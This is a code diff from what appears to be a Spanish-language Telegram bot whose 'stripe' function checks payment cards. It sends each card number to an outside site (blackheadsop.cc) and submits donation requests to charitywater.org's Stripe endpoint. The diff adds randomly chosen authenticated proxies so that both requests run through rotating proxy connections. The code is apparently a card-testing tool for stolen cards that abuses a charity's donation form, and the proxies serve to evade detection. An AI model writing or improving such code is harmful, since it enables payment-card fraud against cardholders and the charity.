@@ -3,9 +3,21 @@ import requests
 from database.db import *
 from utils.bot_config import *
 from handlers.command_handlers import *
+from utils.proxies import *
 
 def stripe(card, message):
-    response = requests.get(f'https://blackheadsop.cc/api/index.php?card={card}')
+
+    session = requests.Session()
+    # Verifica si hay proxies funcionales en el diccionario
+    if proxies_list:
+        # Seleccionar un proxy aleatorio del diccionario
+        selected_proxy = random.choice(list(proxies_list.values()))
+        session.proxies = {
+            'http': f"http://{selected_proxy['user']}:{selected_proxy['pass']}@{selected_proxy['ip']}:{selected_proxy['port']}",
+            'https': f"http://{selected_proxy['user']}:{selected_proxy['pass']}@{selected_proxy['ip']}:{selected_proxy['port']}"
+        }
+    
+    response = session.get(f'https://blackheadsop.cc/api/index.php?card={card}')
     sent_message = bot.send_message(message.chat.id, "Comenzando...")
         for i in range(10):
             bot.edit_message_text(chat_id=message.chat.id,
@@ -96,7 +108,7 @@ def stripe(card, message):
                 'donation_form[metadata][with_saved_payment]': 'false',
             }
 
-            stripe_response = requests.post('https://www.charitywater.org/donate/stripe', cookies=cookies, headers=headers, data=data)
+            stripe_response = session.post('https://www.charitywater.org/donate/stripe', cookies=cookies, headers=headers, data=data)
             elapsed_time = time.time() - start_time
 
             final_message = (
